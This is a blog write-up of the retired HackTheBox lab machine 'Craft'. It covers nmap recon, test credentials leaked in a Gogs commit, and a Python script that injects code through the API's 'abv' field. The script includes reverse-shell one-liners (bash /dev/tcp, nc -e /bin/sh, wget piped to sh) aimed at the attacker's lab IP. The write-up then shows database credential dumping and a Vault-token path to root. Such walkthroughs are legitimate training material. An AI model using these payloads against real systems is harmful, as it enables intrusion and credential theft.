<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>HTB: Craft | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2020/01/htb-craft.html" title="Read more" class="entry-title-link">
                HTB: Craft</a>
        </h1>

        <div class="entry-date">
            <time datetime="2020-01-05T10:35:00+01:00">05 Jan 2020</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
          <a href="../../tag/git.html" title="Read more with the label git" class="meta-link">git</a> 
          <a href="../../tag/gogs.html" title="Read more with the label gogs" class="meta-link">gogs</a> 
          <a href="../../tag/api.html" title="Read more with the label api" class="meta-link">api</a> 
          <a href="../../tag/vault.html" title="Read more with the label vault" class="meta-link">vault</a> 
          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 9 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2020.01/craft_card.png" alt="Craft card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/197">Craft</a>
This box is classified as a medium machine. The user part is quit long and
involve to find "secrets" in a git repository, access an API to get a
reverse shell and manipulate a MySQL database in a jailed environment. The root
part is quit easier and involve to interact with a vault instance.</p>


<h1 id="user">User</h1>
<h2 id="recon">Recon</h2>
<p>We start with an nmap scan. Only the ports 22, 6022 (SSH) and 443 (HTTPS) are open.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Fri Nov  8 15:33:42 2019 as: nmap -p- -sSV -oA 10.10.10.110 10.10.10.110</span>
<span class="code-line">Nmap scan report for 10.10.10.110</span>
<span class="code-line">Host is up (0.15s latency).</span>
<span class="code-line">Not shown: 65532 closed ports</span>
<span class="code-line">PORT     STATE SERVICE  VERSION</span>
<span class="code-line">22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)</span>
<span class="code-line">443/tcp  open  ssl/http nginx 1.15.8</span>
<span class="code-line">6022/tcp open  ssh      (protocol 2.0)</span>
<span class="code-line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
<span class="code-line">SF-Port6022-TCP:V=7.80%I=7%D=11/8%Time=5DC57F7D%P=x86_64-pc-linux-gnu%r(NU</span>
<span class="code-line">SF:LL,C,&quot;SSH-2\.0-Go\r\n&quot;);</span>
<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
<span class="code-line"></span>
<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="code-line"># Nmap done at Fri Nov  8 15:45:26 2019 -- 1 IP address (1 host up) scanned in 704.14 seconds</span>
<span class="code-line"></code></pre></div>

<h2 id="web">Web</h2>
<p>The website present the Craft database for <strong>beers</strong>!</p>
<blockquote>
<p>Craft aims to be the largest repository of US-produced craft brews accessible
over REST. In the future we will release a mobile app to interface with our
public rest API as well as a brew submission process, but for now, check out our API!</p>
</blockquote>
<p>There is also a link to a <a href="https://gogs.io/">gogs</a> as well as the API. This
links redirect to some subdomain. Let us add some informations in our
<code>/etc/hosts</code>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>cat /etc/hosts</span>
<span class="code-line">127.0.0.1   localhost</span>
<span class="code-line">127.0.1.1   kalili</span>
<span class="code-line">10.10.10.110    craft.htb</span>
<span class="code-line">10.10.10.110    api.craft.htb</span>
<span class="code-line">10.10.10.110    gogs.craft.htb</span>
<span class="code-line"></code></pre></div>

<h2 id="gogs">GOGS</h2>
<p>On the gogs commit we can found the credentials of an user used for testing purpose in
the commit <code>10e3ba4f0a09c778d7cec673f28d410b73455a86</code> in the file
<code>test/test.py</code>.</p>
<p><img alt="git file" src="/media/2020.01/craft_1.png"></p>
<p>This creds allow us to interct with the API. Moreover the <code>test.py</code> script take
care to generate a valid token and let us directly interact with the API. The
quote are a bit a pain in the ass here. Nevertheless we can validate the code
execution using a python simpleHTTPserver on our end and execute <code>wget 10.10.14.51:8081/$(&lt;command&gt;)</code>
server side.</p>
<p>At least we get a reverse shell.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="ch">#!/usr/bin/env python</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">requests</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">json</span></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://api.craft.htb/api/auth/login&#39;</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;dinesh&#39;</span><span class="p">,</span> <span class="s1">&#39;4aUh0A8PbVJxgd&#39;</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span></span>
<span class="code-line"><span class="n">json_response</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span></span>
<span class="code-line"><span class="n">token</span> <span class="o">=</span>  <span class="n">json_response</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s1">&#39;X-Craft-API-Token&#39;</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span>  <span class="p">}</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c1"># make sure token is valid</span></span>
<span class="code-line"><span class="c1">#response = requests.get(&#39;https://api.craft.htb/api/auth/check&#39;, headers=headers, verify=False, proxies=proxies)</span></span>
<span class="code-line"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://api.craft.htb/api/auth/check&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span></span>
<span class="code-line"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c1"># create a sample brew with bogus ABV... should fail.</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Create bogus ABV brew&quot;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">brew_dict</span> <span class="o">=</span> <span class="p">{}</span></span>
<span class="code-line"><span class="c1">#brew_dict[&#39;abv&#39;] = &#39;__import__(&quot;os&quot;).system(&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.51/7777 0&gt;&amp;1&quot;)&#39;</span></span>
<span class="code-line"><span class="c1">#brew_dict[&#39;abv&#39;] = &#39;__import__(&quot;os&quot;).system(&quot;wget 10.10.14.51:8081/$(ls ./lolll.sh)&quot;)&#39;</span></span>
<span class="code-line"><span class="c1">#brew_dict[&#39;abv&#39;] = &#39;__import__(&quot;os&quot;).system(&quot;ncat 10.10.14.51 4444 -e /bin/sh &amp;&quot;)&#39;</span></span>
<span class="code-line"><span class="c1">#brew_dict[&#39;abv&#39;] = &#39;__import__(&quot;os&quot;).system(&quot;wget -O - 10.10.14.51:8081/shell.py | sh&quot;)&#39;</span></span>
<span class="code-line"><span class="n">brew_dict</span><span class="p">[</span><span class="s1">&#39;abv&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;__import__(</span><span class="se">\&#39;</span><span class="s1">os</span><span class="se">\&#39;</span><span class="s1">).popen(</span><span class="se">\&#39;</span><span class="s1">nc 10.10.14.194 7777 -e /bin/sh</span><span class="se">\&#39;</span><span class="s1">).read()&#39;</span></span>
<span class="code-line"><span class="c1">#brew_dict[&#39;abv&#39;] = &#39;0.15&#39;</span></span>
<span class="code-line"><span class="n">brew_dict</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bullshit&#39;</span></span>
<span class="code-line"><span class="n">brew_dict</span><span class="p">[</span><span class="s1">&#39;brewer&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bullshit&#39;</span></span>
<span class="code-line"><span class="n">brew_dict</span><span class="p">[</span><span class="s1">&#39;style&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bullshit&#39;</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">brew_dict</span><span class="p">)</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">json_data</span></span>
<span class="code-line"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://api.craft.htb/api/brew/&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span></span>
<span class="code-line"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span></span>
<span class="code-line"></code></pre></div>

<h2 id="api-reverse-shell">API: reverse shell</h2>
<p>Once we get a relay on the box we notice that we are root… but in a docker.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>cat release_agent</span>
<span class="code-line">/var/lib/docker/overlay2/28e271a4328612a47294bbae8c8b7f01470e29454eef499b5beda147a55000e0/diff/c</span>
<span class="code-line">uname -a</span>
<span class="code-line">Linux 5a3d243127f5 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 Linux</span>
<span class="code-line">cat /proc/1/cgroup</span>
<span class="code-line">10:pids:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
<span class="code-line">9:memory:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
<span class="code-line">8:blkio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
<span class="code-line">7:perf_event:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
<span class="code-line">6:net_cls,net_prio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
<span class="code-line">5:freezer:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
<span class="code-line">4:devices:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
<span class="code-line">3:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
<span class="code-line">2:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
<span class="code-line">1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
<span class="code-line"></code></pre></div>

<h2 id="mysql">MySQL</h2>
<p>We explorer the application folder and found some database settings.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>cat craft_api/settings.py</span>
<span class="code-line"># Flask settings</span>
<span class="code-line">FLASK_SERVER_NAME = &#39;api.craft.htb&#39;</span>
<span class="code-line">FLASK_DEBUG = False  # Do not use debug mode in production</span>
<span class="code-line"></span>
<span class="code-line"># Flask-Restplus settings</span>
<span class="code-line">RESTPLUS_SWAGGER_UI_DOC_EXPANSION = &#39;list&#39;</span>
<span class="code-line">RESTPLUS_VALIDATE = True</span>
<span class="code-line">RESTPLUS_MASK_SWAGGER = False</span>
<span class="code-line">RESTPLUS_ERROR_404_HELP = False</span>
<span class="code-line">CRAFT_API_SECRET = &#39;hz66OCkDtv8G6D&#39;</span>
<span class="code-line"></span>
<span class="code-line"># database</span>
<span class="code-line">MYSQL_DATABASE_USER = &#39;craft&#39;</span>
<span class="code-line">MYSQL_DATABASE_PASSWORD = &#39;qLGockJ6G2J75O&#39;</span>
<span class="code-line">MYSQL_DATABASE_DB = &#39;craft&#39;</span>
<span class="code-line">MYSQL_DATABASE_HOST = &#39;db&#39;</span>
<span class="code-line">SQLALCHEMY_TRACK_MODIFICATIONS = False</span>
<span class="code-line"></code></pre></div>

<p>In order to have a "better" shell we can use <code>/bin/sh -i</code></p>
<p>There is a <code>dbtest.py</code> script that allow us to test the connection to the
database. We cat that script in a new one in order to change the SQL line to
list the <code>users</code>'s table. At first I tried with a <code>from users</code>. As there was no
result I tried with the following:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>/opt/app # head -n 15 dbtest.py &gt; dbtest2.py</span>
<span class="code-line">/opt/app # echo &#39;        sql = &quot;SELECT * from user&quot;&#39; &gt;&gt;dbtest2.py</span>
<span class="code-line">/opt/app # echo &#39;        sql = &quot;SELECT * from user&quot;&#39; &gt;&gt;dbtest2.py</span>
<span class="code-line">/opt/app # tail -n 6 dbtest.py &gt;&gt; dbtest2.py</span>
<span class="code-line">/opt/app # python dbtest2.py</span>
<span class="code-line">{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}</span>
<span class="code-line"></code></pre></div>

<p>We get only one user because the <code>dbtest.py</code> script use the <code>cursor.fetchone()</code> function.
The <code>pymysql</code> <a href="https://pymysql.readthedocs.io/en/latest/modules/cursors.html">documentation</a>
indicate that we want to use the <code>cursor.fetchall()</code> function. We modify our
"script":</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>/opt/app # head -n 15 dbtest.py &gt; dbtest2.py</span>
<span class="code-line">/opt/app # echo &#39;        sql = &quot;SELECT * from user&quot;&#39; &gt;&gt;dbtest2.py</span>
<span class="code-line">/opt/app # echo &#39;        cursor.execute(sql)&#39;&gt;&gt;dbtest2.py</span>
<span class="code-line">/opt/app # echo &#39;        result = cursor.fetchall()&#39;&gt;&gt;dbtest2.py</span>
<span class="code-line">/opt/app # tail -n 4 dbtest.py &gt;&gt;dbtest2.py</span>
<span class="code-line">/opt/app # python dbtest2.py</span>
<span class="code-line">[{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}, {&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;}, {&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;}]</span>
<span class="code-line"></code></pre></div>

<p>We can then connect to the GOGS with the <code>gilfoyle</code> credentials.</p>
<p>This user has a private repository containing sensitive information as his private
SSH key. The key is protected by a passphrase. That passhrase is his password!
We need to copy his private and public key in our <code>.ssh</code> folder. We also need to
change the private key permission (<code>chmod 600</code>). We can then SSH to the machine
and get the user flag:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>ssh craft.htb -l gilfoyle</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">  .   *   ..  . *  *</span>
<span class="code-line">*  * @()Ooc()*   o  .</span>
<span class="code-line">    (Q@*0CG*O()  ___</span>
<span class="code-line">  |\_________/|/ _ \</span>
<span class="code-line">  |  |  |  |  | / | |</span>
<span class="code-line">  |  |  |  |  | | | |</span>
<span class="code-line">  |  |  |  |  | | | |</span>
<span class="code-line">  |  |  |  |  | | | |</span>
<span class="code-line">  |  |  |  |  | | | |</span>
<span class="code-line">  |  |  |  |  | \_| |</span>
<span class="code-line">  |  |  |  |  |\___/</span>
<span class="code-line">  |\_|__|__|_/|</span>
<span class="code-line">    \_________/</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">Enter passphrase for key &#39;/root/.ssh/id_rsa&#39;:</span>
<span class="code-line">Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>
<span class="code-line"></span>
<span class="code-line">The programs included with the Debian GNU/Linux system are free software;</span>
<span class="code-line">the exact distribution terms for each program are described in the</span>
<span class="code-line">individual files in /usr/share/doc/*/copyright.</span>
<span class="code-line"></span>
<span class="code-line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
<span class="code-line">permitted by applicable law.</span>
<span class="code-line">gilfoyle@craft:~$ ls</span>
<span class="code-line">user.txt</span>
<span class="code-line">gilfoyle@craft:~$ cat user.txt</span>
<span class="code-line">bbf4b&lt;redacted&gt;</span>
<span class="code-line"></code></pre></div>

<h1 id="getting-root">getting root</h1>
<h2 id="enumeration">enumeration</h2>
<p>When listing the <code>gilfoyle</code> home folder we found a <code>.vault-token</code> file
containing a <a href="https://www.vaultproject.io/">vault</a> token.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>gilfoyle@craft:~$ ls -al</span>
<span class="code-line">total 36</span>
<span class="code-line">drwx------ 4 gilfoyle gilfoyle 4096 Feb  9  2019 .</span>
<span class="code-line">drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..</span>
<span class="code-line">-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc</span>
<span class="code-line">drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config</span>
<span class="code-line">-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile</span>
<span class="code-line">drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh</span>
<span class="code-line">-r-------- 1 gilfoyle gilfoyle   33 Feb  9  2019 user.txt</span>
<span class="code-line">-rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token</span>
<span class="code-line">-rw------- 1 gilfoyle gilfoyle 2546 Feb  9  2019 .viminfo</span>
<span class="code-line">gilfoyle@craft:~$ cat .vault-token</span>
<span class="code-line">f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</span>
<span class="code-line"></code></pre></div>

<h2 id="vault">Vault</h2>
<p>In order to use vault, when need to authenticate ourself with the token.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>gilfoyle@craft:~$ vault login</span>
<span class="code-line">Token (will be hidden):</span>
<span class="code-line">Success! You are now authenticated. The token information displayed below</span>
<span class="code-line">is already stored in the token helper. You do NOT need to run &quot;vault login&quot;</span>
<span class="code-line">again. Future Vault requests will automatically use this token.</span>
<span class="code-line"></span>
<span class="code-line">Key                  Value</span>
<span class="code-line">---                  -----</span>
<span class="code-line">token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</span>
<span class="code-line">token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103</span>
<span class="code-line">token_duration       ∞</span>
<span class="code-line">token_renewable      false</span>
<span class="code-line">token_policies       [&quot;root&quot;]</span>
<span class="code-line">identity_policies    []</span>
<span class="code-line">policies             [&quot;root&quot;]</span>
<span class="code-line"></code></pre></div>

<p>We are member of the vault's
<a href="https://www.vaultproject.io/docs/concepts/policies.html#root-policy">root policy</a>
meaning that we can access everything stored on the vault.</p>
<p>The vault is unsealed. Therefore we can directly access to the data. If this vault
was sealed we will need 3 of the 5 keys to unsealed
the vault (with the <em>shamir</em> seal type).</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>gilfoyle@craft:~$ vault status</span>
<span class="code-line">Key             Value</span>
<span class="code-line">---             -----</span>
<span class="code-line">Seal Type       shamir</span>
<span class="code-line">Initialized     false</span>
<span class="code-line">Sealed          false</span>
<span class="code-line">Total Shares    5</span>
<span class="code-line">Threshold       3</span>
<span class="code-line">Version         0.11.1</span>
<span class="code-line">Cluster Name    vault-cluster-cb7e66f9</span>
<span class="code-line">Cluster ID      8bb98351-0148-3c42-d124-45a87dc43db7</span>
<span class="code-line">HA Enabled      false</span>
<span class="code-line"></code></pre></div>

<p>We can list the secret engine enable on the vault.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>gilfoyle@craft:~$ vault secrets list</span>
<span class="code-line">Path          Type         Accessor              Description</span>
<span class="code-line">----          ----         --------              -----------</span>
<span class="code-line">cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5    per-token private secret storage</span>
<span class="code-line">identity/     identity     identity_56533c34     identity store</span>
<span class="code-line">secret/       kv           kv_2d9b0109           key/value secret storage</span>
<span class="code-line">ssh/          ssh          ssh_3bbd5276          n/a</span>
<span class="code-line">sys/          system       system_477ec595       system endpoints used for control, policy and debugging</span>
<span class="code-line"></code></pre></div>

<p>In the <code>craf-infra</code> repository there is a <code>vault</code> folder containing a
<code>secret.sh</code> file. This file show wich secrets are created: An ssh acces for the
root user.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>craft-infra/vault# cat secrets.sh</span>
<span class="code-line">#!/bin/bash</span>
<span class="code-line"></span>
<span class="code-line"># set up vault secrets backend</span>
<span class="code-line"></span>
<span class="code-line">vault secrets enable ssh</span>
<span class="code-line"></span>
<span class="code-line">vault write ssh/roles/root_otp \</span>
<span class="code-line">    key_type=otp \</span>
<span class="code-line">    default_user=root \</span>
<span class="code-line">    cidr_list=0.0.0.0/0</span>
<span class="code-line"></code></pre></div>

<p>Therefore we just need to use the <code>vault</code>'s <code>ssh</code> command to connect as <code>root</code>
on <code>localhost</code> with the <code>otp</code> mode. We are root on the machine and can access
the flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>gilfoyle@craft:~$ vault ssh -mode=otp root@127.0.0.1</span>
<span class="code-line">WARNING: No -role specified. Use -role to tell Vault which ssh role to use for</span>
<span class="code-line">authentication. In the future, you will need to tell Vault which role to use.</span>
<span class="code-line">For now, Vault will attempt to guess based on the API response. This will be</span>
<span class="code-line">removed in the Vault 1.1.</span>
<span class="code-line">Vault SSH: Role: &quot;root_otp&quot;</span>
<span class="code-line">Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed</span>
<span class="code-line">below. Enter this code in the SSH password prompt. If you install sshpass,</span>
<span class="code-line">Vault can automatically perform this step for you.</span>
<span class="code-line">OTP for the session is: fb100502-b40c-9f60-aa35-f90a5000a2a3</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">  .   *   ..  . *  *</span>
<span class="code-line">*  * @()Ooc()*   o  .</span>
<span class="code-line">    (Q@*0CG*O()  ___</span>
<span class="code-line">  |\_________/|/ _ \</span>
<span class="code-line">  |  |  |  |  | / | |</span>
<span class="code-line">  |  |  |  |  | | | |</span>
<span class="code-line">  |  |  |  |  | | | |</span>
<span class="code-line">  |  |  |  |  | | | |</span>
<span class="code-line">  |  |  |  |  | | | |</span>
<span class="code-line">  |  |  |  |  | \_| |</span>
<span class="code-line">  |  |  |  |  |\___/</span>
<span class="code-line">  |\_|__|__|_/|</span>
<span class="code-line">    \_________/</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">Password:</span>
<span class="code-line">Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>
<span class="code-line"></span>
<span class="code-line">The programs included with the Debian GNU/Linux system are free software;</span>
<span class="code-line">the exact distribution terms for each program are described in the</span>
<span class="code-line">individual files in /usr/share/doc/*/copyright.</span>
<span class="code-line"></span>
<span class="code-line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
<span class="code-line">permitted by applicable law.</span>
<span class="code-line">Last login: Tue Aug 27 04:53:14 2019</span>
<span class="code-line">root@craft:~# cat root.txt</span>
<span class="code-line">831d6&lt;redacted&gt;</span>
<span class="code-line"></code></pre></div>

<h1 id="wrapping-up">Wrapping up</h1>
<p>This box was really interesting as everything is applicable in real life. The
user part was quit long (compared to the user part) and getting a working
reverse shell was a brain crusher. For the root part it was quit easy but allow
me to learn more about <a href="https://www.vaultproject.io">vault</a>.</p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2019/12/htb-wall.html"> HTB: Wall </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2020/01/htb-bitlab.html"> HTB: Bitlab </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
                </li>
        </ul>
    </section>


<section class="module tagcloud">
    <h3 class="title module-title">Tags</h3>

    <ul>
            <li class="tag tag-4">
              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/re.html">RE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openemr.html">openEMR</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/programming.html">programming</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/wordpress.html">wordpress</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/javascript.html">javascript</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adb.html">adb</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/php.html">php</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/metasploit.html">metasploit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/jwt.html">jwt</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/webassembly.html">webassembly</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/htb.html">HTB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/deserialization.html">deserialization</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adminer.html">adminer</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/blog.html">blog</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chisel.html">chisel</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nft.html">NFT</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/azure.html">Azure</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nmap.html">nmap</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/path.html">PATH</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/yaml.html">YAML</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vb.html">VB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/print-nightmare.html">print nightmare</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/devops.html">devops</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dll.html">DLL</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/jackson.html">jackson</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/composer.html">composer</a>
            </li>
            <li class="tag tag-4">
